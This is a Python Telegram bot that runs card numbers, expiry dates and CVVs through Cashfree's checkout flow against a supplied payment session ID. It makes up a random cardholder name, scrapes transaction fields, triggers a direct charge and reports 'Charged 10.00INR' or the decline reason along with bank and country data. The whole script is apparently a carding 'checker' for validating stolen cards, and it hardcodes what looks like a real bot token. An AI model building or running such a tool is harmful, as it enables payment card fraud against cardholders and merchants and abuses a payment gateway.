import httpx
import json
import random
import string
import asyncio
import re
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Bot token - replace with your actual bot token
BOT_TOKEN = "8424565747:AAEpDFSQYL_JaAu7jsouHLH78-V3fFhimls"

def generate_random_name():
    first = ''.join(random.choices(string.ascii_uppercase, k=1) + random.choices(string.ascii_lowercase, k=5))
    last = ''.join(random.choices(string.ascii_uppercase, k=1) + random.choices(string.ascii_lowercase, k=4))
    return f"{first} {last}"

def parse_card_and_session_info(input_string):
    """Parse card information and session ID from various formats"""
    # Remove extra spaces and clean the string
    input_string = input_string.strip()
    
    # Try different separators
    separators = ['|', ':', '/', ' ', '-']
    parts = None
    
    for sep in separators:
        if sep in input_string:
            parts = input_string.split(sep)
            break
    
    # If no separator found, return None
    if not parts or len(parts) != 5:  # Now expecting 5 parts: card, month, year, cvv, session_id
        return None
    
    card_number, month, year, cvv, session_id = parts
    
    # Validate basic format
    if not (card_number.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit()):
        return None
    
    # Normalize month (add leading zero if needed)
    if len(month) == 1:
        month = f"0{month}"
    
    # Normalize year
    if len(year) == 4:
        year_2digit = year[-2:]
        year_4digit = year
    elif len(year) == 2:
        # Assume 20XX for years 00-30, 19XX for years 31-99
        if int(year) <= 30:
            year_4digit = f"20{year}"
        else:
            year_4digit = f"19{year}"
        year_2digit = year
    else:
        return None
    
    return {
        "number": card_number,
        "month": month,
        "year_2digit": year_2digit,
        "year_4digit": year_4digit,
        "cvv": cvv,
        "session_id": session_id.strip()
    }

async def get_bin_info(card_number):
    """Get BIN information from Juspay API"""
    try:
        bin_number = card_number[:6]  # First 6 digits
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(url)
            if response.status_code == 200:
                return response.json()
    except:
        pass
    
    return None

async def process_cashfree_payment_with_session(card_number: str, card_expiry_mm: str, card_expiry_yy: str, card_cvv: str, payment_session_id: str):
    """Execute the Cashfree payment flow with provided session ID"""
    
    # Generate random data once to use consistently
    random_name = generate_random_name()
    
    async with httpx.AsyncClient(timeout=30.0) as client:
        try:
            # Step 1: Submit Card Details (using provided session ID)
            url_1 = "https://api.cashfree.com/checkout/api/checkouts/payments"
            payload_1 = {
                "payment_method": {
                    "card": {
                        "channel": "post",
                        "card_number": card_number,
                        "card_holder_name": random_name,
                        "card_expiry_mm": card_expiry_mm,
                        "card_expiry_yy": card_expiry_yy,
                        "card_cvv": card_cvv,
                        "dcc": False
                    }
                },
                "save_instrument": True,
                "risk_data": "eyJjYXJkX251bWJlcl9pbnB1dF90eXBlIjoidW5rbm93biJ9",
                "reward_ids": []
            }
            headers_1 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
                'Content-Type': "application/json",
                'x-chxs-id': payment_session_id,
                'origin': "https://api.cashfree.com",
                'referer': "https://api.cashfree.com/checkout/payment-method/card/",
            }
            
            response_1 = await client.post(url_1, json=payload_1, headers=headers_1)
            response_1.raise_for_status()
            redirect_url = response_1.json().get('data', {}).get('url')
            
            if not redirect_url:
                return {"error": "Failed to get redirect URL", "step": 1}

            # Step 2: Extract Transaction Data
            response_2 = await client.post(redirect_url)
            response_2.raise_for_status()
            soup = BeautifulSoup(response_2.text, 'html.parser')
            
            # Try to find transaction data with different possible IDs
            txn_data_elem = soup.find('input', {'id': 'txnData'}) or soup.find('input', {'id': 'iframeData'})
            bilgo_elem = soup.find('input', {'id': 'bilgo'})
            txn_id_elem = soup.find('input', {'id': 'txnID'})
            
            if not all([txn_data_elem, bilgo_elem, txn_id_elem]):
                return {"error": "Failed to extract transaction data from HTML", "step": 2}
            
            txn_data = txn_data_elem['value']
            bilgo_url = bilgo_elem['value']
            txn_id = txn_id_elem['value']
            
            # Check if we have iframe data instead of transaction data
            is_iframe_data = txn_data_elem.get('id') == 'iframeData'
            
            # Step 2.5: Authorization request (only if iframe data is present)
            if is_iframe_data:
                url_auth = "https://api.cashfree.com/pg/orders-card/authorization"
                payload_auth = {
                    "transactionData": txn_data,
                    "referenceId": ""
                }
                headers_auth = {
                    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
                    'Content-Type': "application/json",
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                    'sec-ch-ua-mobile': "?1",
                    'origin': "https://api.cashfree.com",
                    'sec-fetch-site': "same-origin",
                    'sec-fetch-mode': "cors",
                    'sec-fetch-dest': "empty",
                    'referer': redirect_url,
                    'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                    'priority': "u=1, i"
                }
                
                response_auth = await client.post(url_auth, json=payload_auth, headers=headers_auth)
                response_auth.raise_for_status()
                
                # Parse the authorization response
                auth_result = response_auth.json()
                
                # Check if there's a pgError in the response
                if 'pgError' in auth_result:
                    pg_error = auth_result['pgError']
                    error_code = pg_error.get('pgErrorCode', 'Unknown')
                    error_desc = pg_error.get('pgErrorDescription', 'Unknown error')
                    can_retry = pg_error.get('canInitiateRetry', False)
                    update_txn_data = pg_error.get('updateTransactionData', False)
                    
                    if update_txn_data and pg_error.get('transactionData'):
                        txn_data = pg_error['transactionData']
                    
                    if not can_retry or error_code in ['05', '06', '07']:
                        return {
                            "error": f"Authorization failed: Code {error_code} - {error_desc}",
                            "step": "2.5",
                            "auth_response": auth_result
                        }
                
                elif auth_result.get('status') == 'SUCCESS':
                    pass
                
                else:
                    return {
                        "error": f"Unknown authorization response format",
                        "step": "2.5",
                        "auth_response": auth_result
                    }

            # Step 3: Execute Direct Charge
            url_3 = f"{bilgo_url}/card/direct-charge"
            payload_3 = {
                "transactionId": txn_id,
                "transactionData": txn_data,
                "commerceIndicator": ""
            }
            headers_3 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
                'Content-Type': "application/json",
                'origin': "https://api.cashfree.com",
                'referer': "https://api.cashfree.com/",
            }
            
            response_3 = await client.post(url_3, json=payload_3, headers=headers_3)
            response_3.raise_for_status()
            
            try:
                return response_3.json()
            except json.JSONDecodeError:
                return {"status": "success", "response_text": response_3.text}
        
        except httpx.HTTPStatusError as e:
            request_url = str(e.request.url)
            status_code = e.response.status_code

            # Handle errors from Step 1: Submit Card Details
            if "checkout/api/checkouts/payments" in request_url:
                if status_code == 400:
                    return {"error": "Invalid card number or session ID", "step": "1"}
                if status_code == 502:
                    return {"error": "Card not supported on this merchant", "step": "1"}
                if status_code == 401:
                    return {"error": "Invalid or expired session ID", "step": "1"}
            
            # Handle errors from Step 2.5: Authorization
            if "/pg/orders-card/authorization" in request_url:
                if status_code == 503:
                    return {"error": "Card authorization failed", "step": "2.5"}

            # Fallback for other unhandled HTTP errors
            return {"error": f"Gateway Error: Received status {status_code}", "step": "unknown"}

        except httpx.RequestError:
            return {"error": "Network Error: Could not connect to the payment gateway.", "step": "unknown"}
        except Exception as e:
            return {"error": f"Unexpected error: {str(e)}", "step": "unknown"}

def format_response(card_info, payment_result, bin_info):
    """Format the response message"""
    card_display = f"{card_info['number']}|{card_info['month']}|{card_info['year_4digit']}|{card_info['cvv']}"
    session_id_display = f"Session: {card_info['session_id'][:10]}..."
    
    # Default values
    status_emoji = "❌"
    status_text = "Failed"
    response_message = "Transaction Failed"
    bank = "Unknown"
    card_type = "Unknown"
    country = "Unknown"
    
    # Parse payment result
    if payment_result.get("status") == "SUCCESS":
        message_data = payment_result.get("message", {})
        txn_status = message_data.get("txnStatus", "UNKNOWN")
        
        if txn_status == "SUCCESS":
            status_emoji = "✅"
            status_text = "Charged 10.00INR"
            response_message = "Transaction Completed"
        else:
            failure_message = message_data.get("message", "Transaction Failed")
            transaction_id = message_data.get("transactionId", "N/A")
            response_message = f"{failure_message}"
            status_text = f"Failed - ID: {transaction_id}"
            
    elif "error" in payment_result:
        error_msg = payment_result["error"]
        if "Failed to extract transaction data from HTML" in error_msg:
            response_message = "Card not supported on this merchant"
        elif "Authorization failed" in error_msg:
            if "auth_response" in payment_result:
                auth_resp = payment_result["auth_response"]
                if "pgError" in auth_resp:
                    pg_error = auth_resp["pgError"]
                    error_code = pg_error.get("pgErrorCode", "Unknown")
                    error_desc = pg_error.get("pgErrorDescription", "")
                    response_message = f"Auth Failed: {error_code} - {error_desc.strip()}"
                else:
                    response_message = "Card authorization failed"
            else:
                response_message = "Card authorization failed"
        else:
            response_message = error_msg
    
    # Parse BIN info
    if bin_info:
        bank = bin_info.get("bank", "Unknown")
        brand = bin_info.get("brand", "")
        card_sub_type = bin_info.get("card_sub_type", "")
        extended_card_type = bin_info.get("extended_card_type", "")
        country = bin_info.get("country", "Unknown")
        
        type_parts = [part for part in [brand, extended_card_type, card_sub_type] if part]
        card_type = " - ".join(type_parts) if type_parts else "Unknown"
    
    response = f"""CC: {card_display}
{session_id_display}
Status: {status_text} {status_emoji}
Response: {response_message}
Gateway: CASHFREE
Bank: {bank}
Type: {card_type}
Country: {country}"""
    
    return response

async def handle_cf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cf command"""
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card information and session ID!\n\n"
            "Usage: /cf CARD|MM|YYYY|CVV|SESSION_ID\n"
            "Example: /cf 4242424242424242|02|2029|123|abc123sessionid\n\n"
            "Supported formats:\n"
            "• CARD|MM|YYYY|CVV|SESSION_ID\n" 
            "• CARD|MM|YY|CVV|SESSION_ID\n"
            "• CARD:MM:YYYY:CVV:SESSION_ID\n"
            "• CARD/MM/YYYY/CVV/SESSION_ID\n"
            "• CARD MM YYYY CVV SESSION_ID"
        )
        return
    
    input_string = " ".join(context.args)
    await process_card_with_session(update, input_string)

async def handle_dot_cf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .cf messages"""
    message_text = update.message.text
    input_string = message_text[3:].strip()
    
    if not input_string:
        await update.message.reply_text(
            "❌ Please provide card information and session ID!\n\n"
            "Usage: .cf CARD|MM|YYYY|CVV|SESSION_ID\n"
            "Example: .cf 4242424242424242|02|2029|123|abc123sessionid"
        )
        return
    
    await process_card_with_session(update, input_string)

async def process_card_with_session(update: Update, input_string: str):
    """Process card information with session ID and send response"""
    processing_msg = await update.message.reply_text("🔄 Processing payment with provided session...")
    
    try:
        card_info = parse_card_and_session_info(input_string)
        if not card_info:
            await processing_msg.edit_text(
                "❌ Invalid format! Please provide:\n"
                "CARD|MM|YYYY|CVV|SESSION_ID\n\n"
                "Example: 4242424242424242|02|2029|123|abc123sessionid"
            )
            return
        
        bin_task = get_bin_info(card_info["number"])
        payment_task = process_cashfree_payment_with_session(
            card_info["number"],
            card_info["month"], 
            card_info["year_2digit"],
            card_info["cvv"],
            card_info["session_id"]
        )
        
        bin_info, payment_result = await asyncio.gather(bin_task, payment_task)
        
        response = format_response(card_info, payment_result, bin_info)
        await processing_msg.edit_text(f"```\n{response}\n```", parse_mode="Markdown")
        
    except Exception as e:
        await processing_msg.edit_text(f"❌ Error: {str(e)}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """🔥 Cashfree Payment Bot (Session Mode)

Commands:
• /cf CARD|MM|YYYY|CVV|SESSION_ID - Process payment
• .cf CARD|MM|YYYY|CVV|SESSION_ID - Process payment

Format Required:
• 4242424242424242|02|2029|123|your_session_id_here

Supported separators:
• Pipe (|): 4242|02|2029|123|session123
• Colon (:): 4242:02:29:123:session123  
• Slash (/): 4242/02/2029/123/session123
• Space: 4242 02 2029 123 session123

Features:
✅ Uses your provided session ID
✅ Enhanced authorization handling
✅ Detailed error messages
✅ BIN information lookup
✅ Multiple format support

Note: You must provide a valid session ID from Cashfree payment form."""
    
    await update.message.reply_text(welcome_text)

def main():
    """Main function to run the bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cf", handle_cf_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.cf\s'), handle_dot_cf))
    
    print("🤖 Bot is starting (Session Mode)...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
